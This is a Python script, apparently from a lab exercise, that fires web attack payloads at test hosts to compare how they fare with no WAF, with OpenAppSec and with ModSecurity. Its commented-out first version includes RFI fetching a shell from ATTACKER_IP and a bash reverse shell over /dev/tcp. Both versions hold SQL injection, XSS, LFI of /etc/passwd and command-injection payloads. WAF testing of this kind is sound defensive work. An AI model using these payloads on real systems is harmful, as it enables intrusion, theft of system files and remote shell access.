# import requests

# # Target URL
# # BASE_URL = "http://snf-6360.vlab.ac.ke"
# BASE_URL = "https://snf-3406.vlab.ac.ke"  # openappsec
# # Attacker's IP and port (Change this to your listener)
# ATTACKER_IP = "127.0.0.1"
# ATTACKER_PORT = "4444"

# # List of attacks to perform
# ATTACKS = [
#     # XSS Attack
#     {
#         "type": "XSS",
#         "endpoint": "/test.php",
#         "method": "GET",
#         "params": {"q": "<script>alert('XSS')</script>"},
#         "check": "<script>alert('XSS')</script>"
#     },
#     # SQL Injection
#     {
#         "type": "SQL Injection",
#         "endpoint": "/admin/index.php",
#         "method": "POST",
#         "data": {"username": "' OR '1'='1' -- ", "password": "password"},
#         "check": "admin"
#     },
#     # Local File Inclusion (LFI)
#     {
#         "type": "LFI",
#         "endpoint": "/test.php",
#         "method": "GET",
#         "params": {"file": "../../etc/passwd"},
#         "check": "root:x:0:0:"
#     },
#     # Remote File Inclusion (RFI)
#     {
#         "type": "RFI",
#         "endpoint": "/test.php",
#         "method": "GET",
#         "params": {"file": f"http://{ATTACKER_IP}/shell.php"},
#         "check": "malicious"
#     },
#     # Command Injection
#     {
#         "type": "Command Injection",
#         "endpoint": "/ping.php",
#         "method": "POST",
#         "data": {"ip": "127.0.0.1; ls -la"},
#         "check": "total"
#     },
#     # Reverse Shell via Command Injection
#     {
#         "type": "Reverse Shell (Command Injection)",
#         "endpoint": "/ping.php",
#         "method": "POST",
#         "data": {"ip": f"127.0.0.1; bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1"},
#         "check": ""
#     },
#     # Reverse Shell via RFI
#     {
#         "type": "Reverse Shell (RFI)",
#         "endpoint": "/test.php",
#         "method": "GET",
#         "params": {"file": f"http://{ATTACKER_IP}/shell.php"},
#         "check": ""
#     },
#     # Path Traversal
#     {
#         "type": "Path Traversal",
#         "endpoint": "/test.php",
#         "method": "GET",
#         "params": {"file": "../../../../etc/passwd"},
#         "check": "root:x:0:0:"
#     },
#     # Brute Force Login
#     {
#         "type": "Brute Force Login",
#         "endpoint": "/login.php",
#         "method": "POST",
#         "data": {"username": "admin", "password": "admin123"},
#         "check": "Welcome"
#     },
#     # Sensitive File Access
#     {"type": "Sensitive File Access", "endpoint": "/phpinfo.php", "method": "GET", "check_status": 200},
#     {"type": "Sensitive File Access", "endpoint": "/config.inc", "method": "GET", "check_status": 200},
#     {"type": "Sensitive Directory Listing", "endpoint": "/passwords/", "method": "GET", "check_status": 200},
#     {"type": "Sensitive Directory Listing", "endpoint": "/db/", "method": "GET", "check_status": 200},
#     {"type": "Sensitive Directory Listing", "endpoint": "/documents/", "method": "GET", "check_status": 200},
#     # Cookie Security Check
#     {"type": "Cookie Security Check", "endpoint": "/", "method": "GET", "check_headers": ["Set-Cookie"]}
# ]


# def attack_target():
#     for attack in ATTACKS:
#         url = BASE_URL + attack["endpoint"]
#         method = attack["method"]

#         print(f"\n🔍 Testing [{attack['type']}] on {attack['endpoint']}...")

#         try:
#             if method == "GET":
#                 response = requests.get(url, params=attack.get("params"))
#                 print(response.status_code)
#             elif method == "POST":
#                 response = requests.post(url, data=attack.get("data"))
#                 print(response.status_code)
#             else:
#                 continue

#             # Check response content
#             if "check" in attack and attack["check"] in response.text:
#                 print(f"⚠️ [Vulnerable] {attack['type']} at {attack['endpoint']}")

#             # Check HTTP status code
#             if "check_status" in attack and response.status_code == attack["check_status"]:
#                 print(f"⚠️ [Exposed] {attack['type']} at {attack['endpoint']} (Status {response.status_code})")

#             # Check for missing security headers
#             if "check_headers" in attack:
#                 for header in attack["check_headers"]:
#                     if header in response.headers and "httponly" not in response.headers[header].lower():
#                         print(f"⚠️ [Insecure Cookie] {header} found without HttpOnly")

#         except requests.exceptions.RequestException as e:
#             print(f"❌ Error: {e}")


# if __name__ == "__main__":
#     attack_target()


import requests
import json
import time

# Target instances
TARGETS = {
    "No_WAF": "http://snf-6360.vlab.ac.ke",
    "OpenAppSec": "https://snf-3406.vlab.ac.ke",
    "ModSecurity": "http://snf-3351.vlab.ac.ke"
}

# Attack scenarios
ATTACKS = [
    {
        "type": "XSS",
        "endpoint": "/test.php",
        "method": "GET",
        "params": {"q": "<script>alert('XSS')</script>"},
    },
    {
        "type": "SQL Injection",
        "endpoint": "/admin/index.php",
        "method": "POST",
        "data": {"username": "' OR '1'='1' -- ", "password": "password"},
    },
    {
        "type": "LFI",
        "endpoint": "/test.php",
        "method": "GET",
        "params": {"file": "../../etc/passwd"},
    },
    {
        "type": "Command Injection",
        "endpoint": "/ping.php",
        "method": "POST",
        "data": {"ip": "127.0.0.1; ls -la"},
    },
    {
        "type": "HTML Injection - Reflected (GET)",
        "endpoint": "/htmli_get.php?firstname=hello&lastname=<b>world<%2Fb>&form=submit",
        "method": "GET",
        "params": "/htmli_get.php?firstname=hello&lastname=<b>world<%2Fb>&form=submit"
    },
        {
        "type": "Remote & Local File Inclusion (RFI/LFI)",
        "endpoint": "rlfi.php?language=/etc/passwd",
        "method": "GET",
        "params": "rlfi.php?language=/etc/passwd"
    }
]

# Data collection function
def attack_target(target_name, base_url):
    results = []
    
    for attack in ATTACKS:
        url = base_url + attack["endpoint"]
        method = attack["method"]

        print(f"\n🔍 Testing [{attack['type']}] on {target_name} ({attack['endpoint']})...")

        try:
            if method == "GET":
                response = requests.get(url, params=attack.get("params"), timeout=5)
            elif method == "POST":
                response = requests.post(url, data=attack.get("data"), timeout=5)
            else:
                continue

            # Collect response details
            result = {
                "target": target_name,
                "attack_type": attack["type"],
                "endpoint": attack["endpoint"],
                "status_code": response.status_code,
                "response_length": len(response.text),
                "response_snippet": response.text[:200]  # Capture first 200 chars
            }
            results.append(result)

            # Log potential blocking behavior
            if response.status_code in [403, 406, 500] or "blocked" in response.text.lower():
                print(f"🚨 [{target_name}] {attack['type']} was BLOCKED (Status: {response.status_code})")
            else:
                print(f"✅ [{target_name}] {attack['type']} might be SUCCESSFUL (Status: {response.status_code})")

            # Delay to avoid rate-limiting
            time.sleep(1)

        except requests.exceptions.RequestException as e:
            print(f"❌ Error testing {attack['type']} on {target_name}: {e}")

    return results

# Run attacks on all targets
all_results = []

for name, url in TARGETS.items():
    results = attack_target(name, url)
    all_results.extend(results)

# Save results to JSON file
with open("attack_results.json", "w") as file:
    json.dump(all_results, file, indent=4)

print("\n📊 Attack simulation completed! Results saved to attack_results.json.")

